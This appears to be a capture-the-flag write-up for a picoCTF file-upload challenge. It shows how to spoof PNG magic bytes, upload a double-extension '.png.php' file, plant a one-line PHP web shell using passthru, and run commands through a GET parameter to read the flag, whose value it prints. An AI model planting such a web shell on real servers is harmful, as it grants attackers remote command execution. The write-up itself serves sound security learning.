`touch empty_payload.png`
`head ~/Downloads/10846.png -c 8 >> only_magic_payload.png`


Use dirbuster to find the `/uploads/` folder

Test and find out that `/uploads/only_magic_payload.png` exists


`cp only_magic_payload.png not_a_png.png.php`


It can be uploaded and can be viewed as text at `/uploads/not_a_png.png.php`


`cp only_magic_payload.png true_payload.png.php`
`echo '<?php passthru($_GET["cmd"]); ?>' >> true_payload.png.php`

Send a GET request: `http://atlas.picoctf.net:64538/uploads/true_payload.png.php?cmd=ls`

From there traverse the system and read the flag file.

`picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9}`
